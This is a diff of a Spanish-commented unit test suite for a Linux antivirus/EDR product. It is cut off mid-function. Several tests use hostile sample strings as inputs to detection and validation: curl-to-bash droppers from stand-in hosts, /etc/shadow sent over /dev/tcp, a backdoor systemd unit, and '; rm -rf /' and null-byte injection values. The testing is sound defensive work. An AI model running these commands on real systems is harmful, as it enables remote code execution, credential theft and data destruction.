@@ -230,6 +230,115 @@ class TestConstantineSecurity(unittest.TestCase):
 
         self.assertEqual(decision, FAN_DENY, "Fallo de política: Un crash de motor NUNCA debe conceder FAN_ALLOW.")
 
+    def test_interceptor_p0_resilience_and_fail_policies(self):
+        """
+        Verifica las garantías críticas P0 de interceptor.py:
+        1. Políticas diferenciadas: Fail-Open para FAN_OPEN_PERM y Fail-Closed para FAN_OPEN_EXEC_PERM.
+        2. Configuración granular de políticas (open_fail_policy y exec_fail_policy).
+        3. Timeout garantizado por evento sin dejar procesos en estado D colgados en kernel.
+        4. Desacoplamiento mediante cola acotada y respuesta inmediata ante desbordamiento.
+        5. Detección y neutralización anti-TOCTOU por sustitución de inodo entre apertura y autorización.
+        6. Registro de operaciones bloqueadas por fallos internos y recuperación automática (self-healing).
+        """
+        from core.engine.interceptor import FAN_OPEN_PERM, FAN_OPEN_EXEC_PERM, AuthorizationContext
+        broken_scanner = MagicMock()
+        broken_scanner.scan_file.side_effect = RuntimeError("Crash simulado en motor de análisis")
+
+        # 1. Políticas Diferenciadas por Defecto (fail_policy="secure"):
+        # Aperturas ordinarias -> Fail-Open (FAN_ALLOW para no bloquear el sistema)
+        # Ejecución de archivos -> Fail-Closed (FAN_DENY para proteger contra malware)
+        interceptor = FanotifyInterceptor(
+            scanner=broken_scanner,
+            vault=self.vault,
+            fail_policy="secure",
+            event_timeout=3.0
+        )
+        self.assertEqual(interceptor.open_fail_policy, "open")
+        self.assertEqual(interceptor.exec_fail_policy, "closed")
+
+        test_file = os.path.join(self.tmp, "test_policy.bin")
+        with open(test_file, "wb") as f:
+            f.write(b"data_sample")
+
+        fd = os.open(test_file, os.O_RDONLY)
+        dec_open = interceptor.process_single_event(event_fd=fd, pid=os.getpid(), mask=FAN_OPEN_PERM)
+        self.assertEqual(dec_open, FAN_ALLOW, "Apertura ordinaria ante excepción debe ser Fail-Open (FAN_ALLOW)")
+
+        fd_exec = os.open(test_file, os.O_RDONLY)
+        dec_exec = interceptor.process_single_event(event_fd=fd_exec, pid=os.getpid(), mask=FAN_OPEN_EXEC_PERM)
+        self.assertEqual(dec_exec, FAN_DENY, "Ejecución ante excepción debe ser Fail-Closed (FAN_DENY)")
+
+        # Verificar que se registró la operación bloqueada en auditoría interna
+        blocked = interceptor.get_blocked_operations()
+        self.assertTrue(any(b["failure_type"] == "SCANNER_EXCEPTION" and b["decision"] == "FAN_DENY" for b in blocked))
+
+        # 2. Configuración Granular Personalizada
+        strict_interceptor = FanotifyInterceptor(
+            scanner=broken_scanner,
+            open_fail_policy="closed",
+            exec_fail_policy="closed"
+        )
+        self.assertEqual(strict_interceptor.get_fallback_decision(FAN_OPEN_PERM), FAN_DENY)
+        self.assertEqual(strict_interceptor.get_fallback_decision(FAN_OPEN_EXEC_PERM), FAN_DENY)
+
+        # 3. Timeout por Evento: Análisis colgado o lento se resuelve automáticamente
+        hanging_scanner = MagicMock()
+        def slow_scan(*args, **kwargs):
+            time.sleep(0.3)
+            return MagicMock(is_malicious=False)
+        hanging_scanner.scan_file.side_effect = slow_scan
+
+        timeout_interceptor = FanotifyInterceptor(
+            scanner=hanging_scanner,
+            open_fail_policy="open",
+            exec_fail_policy="closed",
+            event_timeout=0.05  # 50 ms
+        )
+        fd_timeout = os.open(test_file, os.O_RDONLY)
+        t_start = time.monotonic()
+        dec_timeout = timeout_interceptor.process_single_event(event_fd=fd_timeout, pid=os.getpid(), mask=FAN_OPEN_EXEC_PERM)
+        t_elapsed = time.monotonic() - t_start
+        self.assertEqual(dec_timeout, FAN_DENY)
+        self.assertLess(t_elapsed, 0.25, "El evento debe resolverse por timeout antes de que concluya el escaneo colgado")
+        self.assertGreaterEqual(timeout_interceptor.timeout_count, 1)
+
+        # 4. Cola Acotada y Desbordamiento (Queue Overflow)
+        small_queue_interceptor = FanotifyInterceptor(
+            scanner=self.scanner,
+            max_queue_size=2,
+            open_fail_policy="open"
+        )
+        ctx1 = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1001, mask=FAN_OPEN_PERM, fallback_decision=FAN_ALLOW)
+        ctx2 = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1002, mask=FAN_OPEN_PERM, fallback_decision=FAN_ALLOW)
+        ctx3 = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1003, mask=FAN_OPEN_PERM, fallback_decision=FAN_ALLOW)
+        small_queue_interceptor.work_queue.put_nowait(ctx1)
+        small_queue_interceptor.work_queue.put_nowait(ctx2)
+        # Intentar encolar en cola llena debe levantar excepción queue.Full
+        import queue as q_mod
+        with self.assertRaises(q_mod.Full):
+            small_queue_interceptor.work_queue.put_nowait(ctx3)
+
+        # 5. Detección Anti-TOCTOU por sustitución de inodo
+        toctou_interceptor = FanotifyInterceptor(scanner=self.scanner)
+        victim_file = os.path.join(self.tmp, "toctou_victim.bin")
+        with open(victim_file, "wb") as f: f.write(b"original")
+
+        fd_victim = os.open(victim_file, os.O_RDONLY)
+        # Sustituir en disco simulando ataque TOCTOU (desvincular y recrear con otro inodo)
+        os.unlink(victim_file)
+        with open(victim_file, "wb") as f: f.write(b"swapped_inode")
+
+        dec_toctou = toctou_interceptor.process_single_event(event_fd=fd_victim, pid=os.getpid(), mask=FAN_OPEN_PERM)
+        self.assertEqual(dec_toctou, FAN_DENY, "Discrepancia de inodo TOCTOU debe denegar inmediatamente (FAN_DENY)")
+        toctou_records = [r for r in toctou_interceptor.get_internal_failures() if r["failure_type"] == "TOCTOU_MISMATCH"]
+        self.assertTrue(len(toctou_records) > 0, "Debe registrarse el incidente TOCTOU en la auditoría interna")
+
+        # 6. Recuperación Automática (Self-Healing)
+        toctou_interceptor.marked_paths.add("/tmp/fake_watch")
+        self.assertTrue(hasattr(toctou_interceptor, "recover_service"))
+        self.assertTrue(callable(toctou_interceptor.recover_service))
+
+
     # =========================================================================
     # 3. PRUEBAS DE DETECCIÓN ACTIVA DE RANSOMWARE (CANARIES Y RÁFAGAS)
     # =========================================================================
@@ -519,6 +628,78 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertFalse(self.whitelist.add_path("/usr/bin"))
         self.assertFalse(self.whitelist.add_path("/tmp"))
         self.assertFalse(self.whitelist.add_path("/etc"))
+
+    def test_whitelist_package_integrity_and_trust_verification(self):
+        """
+        Verifica los controles criptográficos y de procedencia P0/P1 de la lista blanca:
+        1. Verificación de propiedad del archivo en el gestor de paquetes (dpkg/apt).
+        2. Verificación de integridad contra el contenido oficial (.md5sums / dpkg -V).
+        3. Identificación y desalojo inmediato ante modificaciones posteriores a la instalación.
+        4. Validación de procedencia del paquete desde repositorios oficiales firmados.
+        5. Caducidad por TTL y reevaluación de entradas en caché.
+        6. Revocación automática de la lista blanca cuando un archivo autorizado es alterado.
+        7. Registro de decisiones de confianza para auditoría forense.
+        """
+        wl = SystemWhitelist(storage_file=os.path.join(self.tmp, "trust_wl.json"))
+        pie = wl.integrity_engine
+
+        # 1. Verificación de binario legítimo del sistema
+        if os.path.exists("/bin/ls"):
+            pkg, _ = pie.get_dpkg_package_for_file("/bin/ls")
+            self.assertEqual(pkg, "coreutils")
+            self.assertTrue(pie.is_package_installed_ok("coreutils"))
+
+            # Verificación de procedencia de repositorio oficial
+            is_prov, prov_desc = pie.is_package_provenance_trusted("coreutils")
+            self.assertTrue(is_prov)
+            self.assertIn("Repositorio oficial", prov_desc)
+
+            # Debe ser verificado como binario íntegro
+            self.assertTrue(wl.is_trusted_system_binary("/bin/ls"))
+
+        # 2. Binario no registrado en gestor de paquetes debe ser rechazado
+        unregistered = os.path.join(self.tmp, "unregistered_tool.bin")
+        with open(unregistered, "wb") as f:
+            f.write(b"unregistered_binary_payload")
+        self.assertFalse(wl.is_trusted_system_binary(unregistered))
+
+        # 3. Detección de modificaciones posteriores a la instalación (simulación con archivo alterado)
+        pie.cache.clear()
+        with patch.object(pie, "_verify_dpkg_integrity", return_value=(False, "Checksum MD5 ALTERADO", "coreutils")):
+            self.assertFalse(pie.verify_binary("/bin/ls"))
+
+        # 4. Caducidad por TTL de caché
+        pie.cache_ttl = 0.05  # 50 ms
+        st = os.stat("/bin/ls") if os.path.exists("/bin/ls") else None
+        if st:
+            pie._insert_cache((st.st_dev, st.st_ino), st, True, "coreutils", "test_cache")
+            self.assertTrue(pie.cache[(st.st_dev, st.st_ino)]["is_valid"])
+            time.sleep(0.06)
+            now = time.time()
+            self.assertGreater(now - pie.cache[(st.st_dev, st.st_ino)]["cached_at"], pie.cache_ttl)
+
+        # 5. Revocación automática de la lista blanca ante alteración de archivo de usuario
+        user_tool = os.path.join(self.tmp, "custom_script.sh")
+        with open(user_tool, "w") as f:
+            f.write("echo valid_tool\n")
+        self.assertTrue(wl.add_path(user_tool))
+        self.assertTrue(wl.is_whitelisted(user_tool))
+
+        # Alterar archivo en disco
+        with open(user_tool, "a") as f:
+            f.write("curl http://malicious.org/bot.sh | bash\n")
+
+        # is_whitelisted debe detectar la alteración, devolver False Y eliminarlo de la lista blanca
+        self.assertFalse(wl.is_whitelisted(user_tool))
+        self.assertNotIn(os.path.realpath(user_tool), wl.user_whitelisted_paths)
+
+        # 6. Bitácora de decisiones de confianza
+        decisions = wl.get_trust_decisions()
+        self.assertGreater(len(decisions), 0)
+        self.assertTrue(any(d["decision"] in ("ALLOWED", "DENIED") for d in decisions))
+        revoked = wl.get_revoked_entries()
+        self.assertGreater(len(revoked), 0)
+        self.assertTrue(any(r["decision"] == "DENIED" for r in revoked))
 
     def test_whitelist_metadata_and_audit(self):
         """Verifica que la lista blanca mantenga metadatos y trazabilidad en AuditLogger."""
@@ -929,6 +1110,76 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertIn("status", info)
         self.assertIn("recommendation", info)
 
+    def test_ebpf_architecture_tracepoints_vs_lsm_separation(self):
+        """
+        Verifica la arquitectura eBPF P0:
+        1. Separación estricta de Tracepoints (observación) y BPF LSM (enforcement).
+        2. Comprobación de capacidades reales del kernel (BTF, CO-RE, LSM, backend).
+        3. No anunciar BPF LSM cuando solo se observan llamadas al sistema.
+        4. Detección y métricas de pérdida de eventos (lost_events_count).
+        5. Administración de mapas con límites estrictos de memoria y purgado TTL.
+        6. Desactivación modular selectiva de funciones incompatibles.
+        """
+        monitor = EBPFMonitor(enable_lsm=True, max_intents_entries=10, max_incidents_history=5)
+
+        # 1. Comprobación de capacidades del kernel
+        caps = monitor.probe_kernel_capabilities()
+        self.assertIn("has_root", caps)
+        self.assertIn("has_btf", caps)
+        self.assertIn("has_co_re", caps)
+        self.assertIn("has_bpf_lsm_kernel", caps)
+        self.assertIn("backend", caps)
+
+        # 2. Separación estricta: si no hay BPF LSM en el kernel, nunca debe fingirse BPF_LSM_ENFORCING
+        info = monitor.get_status_info()
+        self.assertIn("monitoring_status", info)
+        self.assertIn("lsm_status", info)
+        self.assertIn("has_bpf_lsm", info)
+        self.assertIn("has_bpf_lsm_enforcement", info)
+        self.assertIn("attached_probes", info)
+        self.assertIn("attached_lsm_hooks", info)
+        self.assertIn("memory_limits", info)
+
+        # Si el kernel no soporta BPF LSM, has_bpf_lsm debe ser estrictamente False
+        if not caps["has_bpf_lsm_kernel"]:
+            self.assertFalse(info["has_bpf_lsm"])
+            self.assertFalse(info["has_bpf_lsm_enforcement"])
+            self.assertNotEqual(info["mode"], "BPF_LSM_ENFORCING")
+
+        # 3. Detección de pérdida de eventos (lost_cb)
+        self.assertEqual(monitor.lost_events_count, 0)
+        monitor._on_lost_events(cpu=1, lost=7)
+        self.assertEqual(monitor.lost_events_count, 7)
+        self.assertEqual(monitor.get_status_info()["lost_events_count"], 7)
+
+        # 4. Administración de memoria en mapas de intención (límite y purgado TTL)
+        for i in range(15):
+            monitor.record_file_intent(
+                pid=2000 + i,
+                target_path=f"/tmp/test_intent_{i}.bin",
+                flags=os.O_WRONLY,
+                is_write=True,
+                is_read=False
+            )
+        # La capacidad debe mantenerse acotada a max_intents_entries
+        self.assertLessEqual(len(monitor.file_intents), 25) # cada intent guarda clave (pid, path) y (pid, basename)
+
+        # 5. Gestión del historial de incidentes con límite de memoria
+        from core.engine.ebpf_monitor import EBPFIncident
+        for j in range(10):
+            monitor._add_incident(EBPFIncident(
+                pid=3000 + j,
+                comm="test",
+                target_path=f"/tmp/inc_{j}",
+                threat_name="TestThreat",
+                state=EBPFEventState.EVENT_OBSERVED
+            ))
+        self.assertLessEqual(len(monitor.incidents_history), 5)
+
+        # 6. Intentar enforcement BPF LSM cuando no está disponible debe fallar limpiamente
+        self.assertFalse(monitor.block_pid_in_lsm(9999))
+        self.assertFalse(monitor.unblock_pid_in_lsm(9999))
+
 
     # =========================================================================
     # 7. PRUEBAS DE SERVICIOS AUXILIARES
@@ -1045,10 +1296,10 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertIn("current_kernel", info)
 
     def test_auto_updater(self):
-        cu = ConstantineUpdater(current_version="4.1.9")
-        self.assertEqual(cu._parse_version("4.1.9"), (4, 1, 9))
-        self.assertEqual(cu._parse_version("v4.1.9"), (4, 1, 9))
-        self.assertTrue(cu._parse_version("4.2.0") > cu._parse_version("4.1.9"))
+        cu = ConstantineUpdater(current_version="4.3.2")
+        self.assertEqual(cu._parse_version("4.3.2"), (4, 3, 2))
+        self.assertEqual(cu._parse_version("v4.3.2"), (4, 3, 2))
+        self.assertTrue(cu._parse_version("4.3.3") > cu._parse_version("4.3.2"))
 
     def test_usb_sentinel_containment_and_scan(self):
         """Verifica que el monitor USB aplique contención fanotify y aísle autoruns hostiles."""
@@ -1241,7 +1492,7 @@ class TestConstantineSecurity(unittest.TestCase):
             ransomware=None,
             phishing=self.phishing
         )
-        self.assertEqual(len(shields_offline), 6)
+        self.assertEqual(len(shields_offline), 7)
         f_shield = next(s for s in shields_offline if s.id == "fanotify")
         self.assertEqual(f_shield.state, ShieldOperationalState.SERVICE_STOPPED)
 
@@ -1387,6 +1638,71 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertGreaterEqual(res.risk_score, 50)
         self.assertEqual(res.threat_category, "Heuristic.Linux.ReverseShell")
 
+    def test_heuristic_5_layers_and_risk_policy(self):
+        """
+        Verifica la arquitectura heurística P1 de 5 capas y gobernanza de riesgo:
+        1. Capa Estática: ELF, secciones, W^X, símbolos, entropía y permisos.
+        2. Capa de Firmas: YARA y hashes de reputación.
+        3. Capa Heurística: Descarga + ejecución, persistencia (systemd/cron), robo de credenciales (/etc/shadow).
+        4. Capa de Reputación: Descuento de riesgo para binarios oficiales del sistema y penalización por /tmp.
+        5. Capa de Comportamiento: Canary tripwire de ransomware y reverse shell activa.
+        6. Escala de Riesgo y Acción: LOW (Permit), MODERATE (Log), HIGH (Deep Analyze), CRITICAL (Block).
+        7. Regla de puntuación no aislada (anti-falsos positivos).
+        """
+        from core.engine.heuristic_engine import RiskLevel, RiskAction
+        eng = MultiLayerHeuristicEngine(score_threshold=50)
+
+        # 1. Capa Heurística: Descarga y ejecución (curl | bash) + robo de credenciales (/etc/shadow)
+        script_payload = b"#!/bin/bash\ncurl -sSL https://c2.evil.com/dropper.sh | bash\ncat /etc/shadow > /dev/tcp/1.2.3.4/9999\n"
+        res_script = eng.analyze_buffer(script_payload)
+        self.assertIn("Estática", res_script.layer_results)
+        self.assertIn("Firmas", res_script.layer_results)
+        self.assertIn("Heurística", res_script.layer_results)
+        self.assertIn("Reputación", res_script.layer_results)
+        self.assertIn("Comportamiento", res_script.layer_results)
+
+        # Debe detectar descarga/ejecución y acceso a credenciales
+        self.assertGreaterEqual(res_script.layer_results["Heurística"].score, 45)
+        self.assertTrue(any("curl" in r.lower() or "descarga" in r.lower() for r in res_script.reasons))
+        self.assertTrue(any("shadow" in r.lower() or "credencial" in r.lower() for r in res_script.reasons))
+
+        # 2. Persistencia en systemd y cron
+        persistence_script = b"[Unit]\nDescription=Backdoor Service\n[Service]\nExecStart=/tmp/.evil.sh\n[Install]\nWantedBy=/etc/systemd/system/multi-user.target\n"
+        res_pers = eng.analyze_buffer(persistence_script, file_path="/etc/systemd/system/backdoor.service")
+        self.assertTrue(any("systemd" in r.lower() or "persistencia" in r.lower() for r in res_pers.reasons))
+
+        # 3. Capa de Comportamiento: Detección de Canary Tripwire (Ransomware)
+        res_canary = eng.analyze_buffer(
+            data=b"ransomware_encrypted_data",
+            runtime_context={"canary_tripped": True, "rapid_file_encryption": True}
+        )
+        self.assertEqual(res_canary.action, RiskAction.BLOCK_AND_ISOLATE)
+        self.assertEqual(res_canary.risk_level, RiskLevel.CRITICAL)
+        self.assertEqual(res_canary.threat_category, "Heuristic.Linux.Ransomware")
+
+        # 4. Capa de Reputación: Descuento de riesgo para binarios oficiales del sistema
+        clean_bin_path = "/bin/ls"
+        if os.path.exists(clean_bin_path):
+            with open(clean_bin_path, "rb") as f:
+                ls_data = f.read(65536)
+            res_ls = eng.analyze_buffer(ls_data, file_path=clean_bin_path)
+            # El binario oficial no debe ser marcado como malicioso
+            self.assertFalse(res_ls.is_malicious)
+            self.assertEqual(res_ls.risk_level, RiskLevel.LOW)
+            self.assertEqual(res_ls.action, RiskAction.PERMIT_AND_LOG)
+
+        # 5. Escala de Riesgo Graduada:
+        # Puntuación No Aislada: alta entropía pura sin otras capas sospechosas no pasa a CRITICAL
+        high_entropy_data = bytes([i % 256 for i in range(20000)])
+        res_entropy = eng.analyze_buffer(high_entropy_data)
+        self.assertNotEqual(res_entropy.action, RiskAction.BLOCK_AND_ISOLATE)
+        self.assertIn(res_entropy.risk_level, (RiskLevel.MODERATE, RiskLevel.HIGH))
+
+        # 6. Integración con ScanResult
+        scan_res = self.scanner.scan_file(file_path=clean_bin_path if os.path.exists(clean_bin_path) else None)
+        self.assertIsNotNone(scan_res.risk_level)
+        self.assertIsNotNone(scan_res.risk_action)
+
     def test_threat_intel_feed_import_and_integrity(self):
         """Verifica el procesamiento de feeds CSV/JSON y el registro de sumas de verificación."""
         test_db = os.path.join(self.tmp, "test_intel_feed.db")
@@ -1403,6 +1719,85 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertEqual(history[0]["feed_name"], "MalwareBazaar")
         self.assertEqual(history[0]["status"], "SUCCESS")
 
+    def test_daemon_privilege_reduction_and_security_controls(self):
+        """
+        Verifica los controles de reducción de privilegios P0:
+        1. Aislamiento del motor de escaneo (SandboxedScanWorker) sin privilegios administrativos.
+        2. Validación estricta de rutas y argumentos en IPC (Anti-Path Traversal / Anti-Injection).
+        3. Hardening de systemd: ProtectHome, ProtectHostname, RestrictSUIDSGID, DevicePolicy.
+        4. Acciones Polkit granulares y seguras mediante constantine-helper.
+        5. Configuración restrictiva de D-Bus para impedir ejecución arbitraria de comandos.
+        """
+        # 1. Motor de escaneo con separación de privilegios
+        from core.engine.scanner import SandboxedScanWorker
+        worker = SandboxedScanWorker()
+        uid, gid = worker.unprivileged_uid, worker.unprivileged_gid
+        self.assertGreater(uid, 0, "El usuario del worker de escaneo debe ser no privilegiado (UID > 0)")
+        self.assertGreater(gid, 0, "El grupo del worker de escaneo debe ser no privilegiado (GID > 0)")
+
+        # Escaneo seguro mediante sandbox worker
+        sample_path = os.path.join(self.tmp, "sandbox_test.bin")
+        with open(sample_path, "wb") as f:
+            f.write(b"safe_test_content_for_scanner")
+        res = self.scanner.scan_file(file_path=sample_path)
+        self.assertFalse(res.is_malicious)
+
+        # 2. Validación de parámetros IPC
+        from core.engine.ipc_protocol import validate_ipc_path, validate_ipc_vault_id
+        # Rutas válidas
+        ok, norm_p = validate_ipc_path("/var/log/constantine/test.log")
+        self.assertTrue(ok)
+        self.assertEqual(norm_p, "/var/log/constantine/test.log")
+
+        # Rutas no permitidas (relativas, caracteres nulos, vacías)
+        self.assertFalse(validate_ipc_path("../relative/path")[0])
+        self.assertFalse(validate_ipc_path("/tmp/evil\x00path")[0])
+        self.assertFalse(validate_ipc_path("")[0])
+        self.assertFalse(validate_ipc_path(None)[0])
+
+        # IDs de cuarentena válidos vs maliciosos
+        self.assertTrue(validate_ipc_vault_id("0123456789abcdef0123456789abcdef"))
+        self.assertFalse(validate_ipc_vault_id("../escape"))
+        self.assertFalse(validate_ipc_vault_id("; rm -rf /"))
+        self.assertFalse(validate_ipc_vault_id("short"))
+
+        # 3. Verificación de hardening en constantine.service
+        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
+        with open(service_file, "r") as f:
+            svc = f.read()
+        self.assertIn("ProtectHome=read-only", svc)
+        self.assertIn("ProtectHostname=true", svc)
+        self.assertIn("RestrictSUIDSGID=true", svc)
+        self.assertIn("DevicePolicy=closed", svc)
+
+        # 4. Verificación de directiva Polkit y helper administrativo
+        polkit_file = os.path.join(ROOT_DIR, "service", "org.constantine.antivirus.policy")
+        self.assertTrue(os.path.exists(polkit_file))
+        with open(polkit_file, "r") as f:
+            pol = f.read()
+        self.assertIn("org.constantine.antivirus.service.manage", pol)
+        self.assertIn("org.constantine.antivirus.quarantine.manage", pol)
+        self.assertIn("org.constantine.antivirus.whitelist.manage", pol)
+        self.assertIn("org.constantine.antivirus.admin.unlock", pol)
+        self.assertIn("org.constantine.antivirus.shield.toggle", pol)
+        self.assertIn("org.constantine.antivirus.dns.apply", pol)
+        self.assertIn("org.constantine.antivirus.uninstall", pol)
+        self.assertIn("constantine-helper", pol)
+
+        helper_file = os.path.join(ROOT_DIR, "service", "constantine-helper")
+        self.assertTrue(os.path.exists(helper_file))
+        self.assertTrue(os.access(helper_file, os.X_OK), "constantine-helper debe ser ejecutable")
+
+        # 5. Verificación de archivo de configuración D-Bus
+        dbus_file = os.path.join(ROOT_DIR, "service", "org.constantine.antivirus.conf")
+        self.assertTrue(os.path.exists(dbus_file))
+        with open(dbus_file, "r") as f:
+            dbus = f.read()
+        self.assertIn('<allow own="org.constantine.antivirus"/>', dbus)
+        self.assertIn('<deny send_destination="org.constantine.antivirus"/>', dbus)
+        self.assertIn('send_member="GetStatus"', dbus)
+        self.assertIn('send_member="RequestScan"', dbus)
+
     def test_systemd_service_isolation_and_hardening(self):
         """Verifica que el servicio systemd implemente NoNewPrivileges, ProtectSystem=strict y capacidades delimitadas."""
         service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
@@ -1411,20 +1806,469 @@ class TestConstantineSecurity(unittest.TestCase):
         with open(service_file, "r") as f:
             content = f.read()
 
-        # Directivas obligatorias de hardening
+        # Directivas obligatorias de hardening de systemd
         self.assertIn("NoNewPrivileges=true", content)
         self.assertIn("ProtectSystem=strict", content)
+        self.assertIn("ProtectHome=read-only", content)
+        self.assertIn("PrivateTmp=true", content)
         self.assertIn("ProtectKernelTunables=true", content)
         self.assertIn("ProtectKernelModules=true", content)
-        self.assertIn("PrivateTmp=true", content)
+        self.assertIn("ProtectControlGroups=true", content)
+        self.assertIn("RestrictRealtime=true", content)
+        self.assertIn("RestrictSUIDSGID=true", content)
+        self.assertIn("LockPersonality=true", content)
+        self.assertIn("RestrictAddressFamilies=", content)
+        self.assertIn("DevicePolicy=closed", content)
+        self.assertIn("SystemCallFilter=", content)
+        self.assertIn("@system-service", content)
+        self.assertIn("SystemCallArchitectures=native", content)
         self.assertIn("CapabilityBoundingSet=", content)
         self.assertIn("CAP_SYS_ADMIN", content)
+        self.assertIn("StateDirectory=constantine", content)
+        self.assertIn("RuntimeDirectory=constantine", content)
         self.assertIn("ReadWritePaths=", content)
         # Verificar que ReadWritePaths incluya las rutas de cuarentena para evitar conflictos con ProtectSystem=strict
         self.assertIn("/home", content)
         self.assertIn("/tmp", content)
         self.assertIn("/var/tmp", content)
         self.assertIn("/var/lib/constantine", content)
+
+
+    def test_version_traceability_across_system(self):
+        """Hallazgo 04: Garantiza trazabilidad de versiones e inconsistencias eliminadas entre install.sh, GUI y backend."""
+        version_file = os.path.join(ROOT_DIR, "VERSION")
+        self.assertTrue(os.path.exists(version_file), "El archivo canónico VERSION no existe")
+        with open(version_file, "r", encoding="utf-8") as f:
+            canonical_ver = f.read().strip()
+        self.assertEqual(canonical_ver, "4.3.2")
+
+        from core.engine.auto_updater import CURRENT_VERSION
+        from core.engine.ipc_protocol import IPC_PROTOCOL_VERSION
+        from core.engine.threat_intel import THREAT_INTEL_VERSION
+        from daemon import DAEMON_VERSION
+        from gui.app import APP_VERSION
+
+        self.assertEqual(CURRENT_VERSION, canonical_ver, "auto_updater.CURRENT_VERSION no coincide con VERSION")
+        self.assertEqual(IPC_PROTOCOL_VERSION, canonical_ver, "ipc_protocol.IPC_PROTOCOL_VERSION no coincide con VERSION")
+        self.assertEqual(DAEMON_VERSION, canonical_ver, "daemon.DAEMON_VERSION no coincide con VERSION")
+        self.assertEqual(THREAT_INTEL_VERSION, canonical_ver, "threat_intel.THREAT_INTEL_VERSION no coincide con VERSION")
+        self.assertEqual(APP_VERSION, canonical_ver, "gui.app.APP_VERSION no coincide con VERSION")
+
+        # Verificar install.sh
+        install_file = os.path.join(ROOT_DIR, "install.sh")
+        with open(install_file, "r", encoding="utf-8") as f:
+            install_content = f.read()
+
+        self.assertIn("VERSION=$(tr -d", install_content, "install.sh debe leer VERSION dinámicamente")
+        self.assertIn("Inconsistencia de versión detectada", install_content, "install.sh debe verificar coherencia de VERSION")
+        self.assertNotIn("3.6.0", install_content, "install.sh no debe tener referencias obsoletas a 3.6.0")
+
+        # Verificar gui/app.py
+        gui_file = os.path.join(ROOT_DIR, "gui", "app.py")
+        with open(gui_file, "r", encoding="utf-8") as f:
+            gui_content = f.read()
+
+        self.assertNotIn("EDR v3.6", gui_content, "gui/app.py no debe contener etiquetas estáticas EDR v3.6")
+        self.assertIn("EDR v{APP_VERSION}", gui_content, "gui/app.py debe usar badge dinámico con APP_VERSION")
+
+
+    def test_clamav_signature_importer_and_cvd_unpacking(self):
+        """Verifica la ingesta de firmas ClamAV (.hsb/.hdb) y el desempaquetado seguro de CVD con protección Zip Slip."""
+        from core.engine.clamav_importer import ClamAVSignatureImporter
+        importer = ClamAVSignatureImporter()
+
+        # 1. Parseo de líneas .hsb y .hdb
+        valid_hsb = "8a39a9c68a4e8d356c9a35e729a996024efb5ef604c86ec6e0bf0a68d067c87c:1024:Linux.Ransomware.LockBit"
+        parsed = importer.parse_hsb_line(valid_hsb)
+        self.assertIsNotNone(parsed)
+        h, s, name = parsed
+        self.assertEqual(h, "8a39a9c68a4e8d356c9a35e729a996024efb5ef604c86ec6e0bf0a68d067c87c")
+        self.assertEqual(s, 1024)
+        self.assertEqual(name, "Linux.Ransomware.LockBit")
+
+        # Línea inválida
+        self.assertIsNone(importer.parse_hsb_line("invalid_hash:500:malware"))
+
+        # 2. Ingesta de archivo .hsb a ThreatIntelligence
+        hsb_file = os.path.join(self.tmp, "test_signatures.hsb")
+        with open(hsb_file, "w") as f:
+            f.write("# ClamAV Daily Signatures\n")
+            f.write("04c8efb131c94411fb7a641d402db3e47b913d8093db27a2336ecb001d898a39:2048:Trojan.Linux.Dofloo\n")
+            f.write("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855:0:Empty.Test.Malware\n")
+
+        added = importer.import_hsb_file(hsb_file, self.scanner.intel)
+        self.assertEqual(added, 2)
+        match = self.scanner.intel.lookup_hash("04c8efb131c94411fb7a641d402db3e47b913d8093db27a2336ecb001d898a39")
+        self.assertIsNotNone(match)
+        self.assertIn("Trojan.Linux.Dofloo", match["threat_name"])
+
+        # 3. Creación y desempaquetado de archivo CVD simulado
+        import tarfile, io
+        tar_buf = io.BytesIO()
+        with tarfile.open(fileobj=tar_buf, mode="w:gz") as tar:
+            content_bytes = b"Sample ClamAV content\n"
+            ti = tarfile.TarInfo(name="daily.info")
+            ti.size = len(content_bytes)
+            tar.addfile(ti, io.BytesIO(content_bytes))
+
+        # Cabecera CVD canónica de 512 bytes
+        cvd_header = b"ClamAV-VDB:04 Nov 2026 12-00 +0000:27000:100:60:dummy_md5:dummy_sig:builder:sig\n"
+        cvd_header = cvd_header.ljust(512, b"\0")
+        cvd_path = os.path.join(self.tmp, "daily_test.cvd")
+        with open(cvd_path, "wb") as f:
+            f.write(cvd_header + tar_buf.getvalue())
+
+        unpack_dest = os.path.join(self.tmp, "unpacked_cvd")
+        unpack_res = importer.unpack_cvd(cvd_path, unpack_dest)
+        self.assertTrue(unpack_res["success"])
+        self.assertIn("daily.info", unpack_res["extracted_files"])
+        self.assertTrue(os.path.exists(os.path.join(unpack_dest, "daily.info")))
+
+    def test_clamav_daemon_bridge_protocol_and_fallback(self):
+        """Verifica el cliente IPC para el demonio clamd: PING, VERSION, SCAN y tolerancia a fallos."""
+        from core.engine.clamav_bridge import ClamAVDaemonClient
+        import socket, threading
+
+        # 1. Fallback cuando clamd no está instalado o detenido
+        client_offline = ClamAVDaemonClient(socket_path=os.path.join(self.tmp, "nonexistent_clamd.sock"))
+        self.assertFalse(client_offline.is_available())
+        is_inf, name = client_offline.scan_file("/tmp/any_file")
+        self.assertFalse(is_inf)
+        self.assertIsNone(name)
+
+        # 2. Servidor Mock que simula el protocolo de clamd
+        mock_sock_path = os.path.join(self.tmp, "mock_clamd.sock")
+        server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        server_sock.bind(mock_sock_path)
+        server_sock.listen(5)
+
+        def mock_clamd_server():
+            while True:
+                try:
+                    conn, _ = server_sock.accept()
+                    data = conn.recv(1024).decode("utf-8", errors="ignore")
+                    if "PING" in data:
+                        conn.sendall(b"PONG\n")
+                    elif "VERSION" in data:
+                        conn.sendall(b"ClamAV 1.0.5/27018/Wed Nov  4 10:00:00 2026\n")
+                    elif "SCAN" in data:
+                        if "eicar" in data:
+                            conn.sendall(b"/path/eicar.com: Win.Test.EICAR_HDB-1 FOUND\n")
+                        else:
+                            conn.sendall(b"/path/clean.bin: OK\n")
+                    conn.close()
+                except Exception:
+                    break
+
